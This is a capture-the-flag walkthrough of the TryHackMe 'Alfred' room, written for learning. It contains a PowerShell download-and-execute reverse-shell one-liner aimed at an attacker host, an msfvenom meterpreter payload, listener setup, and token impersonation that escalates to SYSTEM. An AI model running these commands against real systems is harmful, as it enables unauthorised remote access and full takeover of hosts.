Room: [Alfred](https://tryhackme.com/room/alfred)

Difficulty: Easy

Overview: This room is a semi-guided challenge. We are going to exploit a Jenkins server, gain an initial shell, then escalate privileges by exploiting Windows authentication tokens with meterpreter module incognito.

------------------------------------------------------------------------------------------------------------------------------------------------------------------

First we need to scan for all open ports using nmap, but since the machine doesn't respond to ping (ICMP) we need to adjust the scan:

```
nmap  -Pn -A -p- 10.10.101.250 -T4

-Pn   → Because the machine don't respond to ping
-A    → Enable OS detection, version detection, script scanning, and traceroute
-p-   → Scan all ports
-T4   → To speed the scan (this loses some accuracy), otherwise it would take more time to complete.
```

![Alfred_nmap_scan](https://user-images.githubusercontent.com/76821053/118020693-4ae2cd80-b352-11eb-8f5c-5e8250883d63.png)

The http at port 8080 hosted a jenkins server. We can try default credentials and this one was pretty simple.

![jenkins_8080](https://user-images.githubusercontent.com/76821053/118023732-c8f4a380-b355-11eb-8ea8-ee409d9ddc01.png)

We can created a new project inside Jenkins. At configurations we have a field called Build that let us do commands, so we can use the powershell command given by the room:

```
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

In my case i used the below command, where i change the ip and port to match my machine.

```
powershell iex (New-Object Net.WebClient).DownloadString('http://My_IP:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress My_IP -Port 9001
```

To breakdown this command we can tell that the first part of the command will download a file from a specific website or server, in this case from my kali machine and the 
second part of the command tells the windows machine to execute it in order for us to get a reverse shell.

For this command to work and get a reverse shell on our machine we need to setup a few things:

-- Download Nishang "Invoke-PowerShellTcp.ps1" payload script provided by the room. Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security.

-- A python SimpleHTTPServer in order to host the file that the remote machine will try to download. We can do this by typing this command on a kali machine:

```
python -m SimpleHTTPServer
```

![pythonserver](https://user-images.githubusercontent.com/76821053/118032170-3fe26a00-b35f-11eb-919e-8483e5469701.png)

-- Start a netcat listener on the same port has the payload:

![nclistener](https://user-images.githubusercontent.com/76821053/118028995-9c438a80-b35b-11eb-8463-7b4c797b97d2.png)

After setting all up we just start a new project on jenkins server (in my case i called it admin), add the command to the build tab and just run it:   

![jenkinsproject](https://user-images.githubusercontent.com/76821053/118030688-88992380-b35d-11eb-89a6-74a434f02cb0.png)

We can see that the remote machine downloads the script and run it:

![pythonhttpserver](https://user-images.githubusercontent.com/76821053/118028046-85e8ff00-b35a-11eb-8d9c-32d510ae7b57.png)

Our listener recieves a reverse shell connection:

![image](https://user-images.githubusercontent.com/76821053/131248468-e25aedea-532e-4088-9712-9bd282dfeede.png)

To search for the flag or any specific file we can use the following command:

```
Get-ChildItem -Path C:\ -Recurse "user.txt" -ErrorAction SilentlyContinue

-Path  → Choose the path you want
-Recurse → To recursively search subdirectories  
-ErrorAction SilentlyContinue → To ignore errors
```

![image](https://user-images.githubusercontent.com/76821053/131248549-cfdf06bb-a839-4f28-9f46-be8db0b1e6e1.png)

We can now read the flag by using “type”:

![image](https://user-images.githubusercontent.com/76821053/131248555-010718a7-d90e-4611-bc37-c3073abb3be3.png)

Now let's upgrade our shell to a meterpreter one. To do so we need to create a payload:

```
msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -o payload.exe LHOST=YOUR_IP_ADDRESS LPORT=CHOOSE_A_PORT
```

![image](https://user-images.githubusercontent.com/76821053/131249292-4efa51fe-c0cf-4e8d-be24-6f5972d5d5ea.png)

In this case i created a meterpreter .exe payload encoded with shikata_ga_nai. If we check the size of the payload we can answer one of the questions of the room.

To upload this payload to the target machine we need once again to host this file in a SimpleHTTPServer:

![image](https://user-images.githubusercontent.com/76821053/131248806-8c6499d4-59d5-43bc-b641-eb9b2fa93b30.png)

From the target machine we can request it with this powershell command:

![image](https://user-images.githubusercontent.com/76821053/131248869-353d8387-5417-47f7-a09c-51b318e122e4.png)

Now that we have the payload ready we need to start a meterpreter listener. So we are going to fire up metasploit.

We need to change some parameters to match our payload, ip address and port:

```
use multi/handler  → Choose exploit, in this case a listener

set payload windows/meterpreter/reverse_tcp  →  Set the same payload used in the our msfvenom payload

set LHOST your_ip_address  →  Choose your ip address

set LPORT payload_chosen_port  → Choose the same port has the payload that we created with msfvenom

options  →  To list all the available options

run  →  To start the listener
```

![image](https://user-images.githubusercontent.com/76821053/131249057-b7e4e405-8711-4645-887c-04ef0d547e59.png)

On the target machine we just have to run the payload.exe file:

```
.\payload.exe 

or

Start-Process “payload.exe”
```

![image](https://user-images.githubusercontent.com/76821053/131249240-10687032-47d2-4c79-a18d-dd7dc907934a.png)

Moments after we got a shell on the meterpreter session:

![image](https://user-images.githubusercontent.com/76821053/131249265-80c1e8fb-2b93-49ee-883b-9b56e565f3c6.png)

If you want to change the meterpreter shell to a regular one you can just type "shell". And, to back out just type "exit".

Before we can actually take full control of the system we can check what privileges the current user has:

```
whoami /priv
```

![image](https://user-images.githubusercontent.com/76821053/131886602-0fc697f7-5ca3-4df8-894a-f08e82f7f6af.png)

If we look closely there are two important privileges (SeDebugPrivilege and SeImpersonatePrivilege) enabled. And by using a module call "incognito" we can take advantage of this privileges and privesc vertically to NT Authority.

To load a module just use:

```
load incognito
```

![image](https://user-images.githubusercontent.com/76821053/131887372-becfb5c2-539a-4afa-a0f1-cd01bace22bd.png)

Now we need to check what tokens are available and use the a function called "impersonate_token" command to impersonate the Administrators token:

```
list_tokens -g
```

![image](https://user-images.githubusercontent.com/76821053/131887656-15e5862a-4355-4821-8c80-5b759401133d.png)

Since "BUILTIN\Administrators" token is available we just need to impersonate it:

```
impersonate_token "BUILTIN\Administrators"
```

![image](https://user-images.githubusercontent.com/76821053/131887920-d1ce7a11-bb96-4fd8-8da4-495be871f94f.png)

Success we are now "NT Authority\System"!

We have to ensure that we migrate our process to a process with correct permissions where the process is running by "NT Authority\System":

To list processes:

```
ps
```

![image](https://user-images.githubusercontent.com/76821053/131888441-6f8e19e1-3c4f-44c1-8bbf-1852f2a38ad8.png)

Migrating to a different process:

```
migrate 668
```

![image](https://user-images.githubusercontent.com/76821053/131888518-ecc9cad4-06ac-432b-b450-5c4d607001d5.png)

Now that we currently have the right process and permissions we can read the final flag of the room.

The flag is at "C:\Windows\System32\config":

![image](https://user-images.githubusercontent.com/76821053/131888701-f366c4ac-635b-45f3-af90-413fc6cff4cd.png)





